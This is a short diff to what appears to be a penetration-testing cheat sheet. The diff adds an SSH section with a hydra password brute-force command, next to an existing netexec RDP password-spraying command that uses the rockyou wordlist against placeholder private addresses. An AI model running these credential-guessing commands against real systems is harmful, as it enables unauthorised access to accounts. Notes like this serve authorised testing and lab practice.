@@ -17,3 +17,10 @@ thread 20
 ```
 netexec rdp 192.168.x.x -u user -p /tmp/rockyou-utf8.txt -t 20
 ```
+
+# ssh
+
+### hydra
+```
+hydra -l eve -P wordlist 192.168.x.x -t 4 ssh -V
+```
